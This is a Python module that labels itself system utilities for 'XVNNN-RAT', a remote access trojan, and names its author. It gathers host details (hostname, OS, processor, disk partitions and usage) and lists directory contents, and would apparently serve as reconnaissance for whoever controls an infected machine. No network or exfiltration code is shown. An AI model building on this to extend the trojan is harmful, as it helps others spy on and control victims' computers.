"""
System utilities for XVNNN-RAT
Author: Ali Zafar (alizafarbati@gmail.com)
"""

import platform
import os
import psutil
import logging

logger = logging.getLogger(__name__)

def get_system_info():
    """Get system information"""
    try:
        info = {
            'hostname': platform.node(),
            'os': platform.system(),
            'os_version': platform.release(),
            'arch': platform.machine(),
            'processor': platform.processor(),
            'current_dir': os.getcwd()
        }
        
        # Add disk information
        try:
            disks = []
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    disks.append({
                        'device': partition.device,
                        'mountpoint': partition.mountpoint,
                        'total': usage.total,
                        'used': usage.used,
                        'free': usage.free,
                        'percent': usage.percent
                    })
                except:
                    pass
            info['disks'] = disks
        except:
            pass
        
        return info
    except Exception as e:
        logger.error(f"Failed to get system info: {e}")
        return {'error': str(e)}

def list_directory(path):
    """List directory contents"""
    try:
        if not path:
            path = os.getcwd()
        
        files = []
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            try:
                if os.path.isdir(item_path):
                    files.append(f"[DIR] {item}/")
                else:
                    size = os.path.getsize(item_path)
                    files.append(f"{item} ({size:,} bytes)")
            except:
                files.append(f"{item} [ACCESS DENIED]")
        return files
    except Exception as e:
        logger.error(f"Failed to list directory: {e}")
        return [f"Error: {str(e)}"]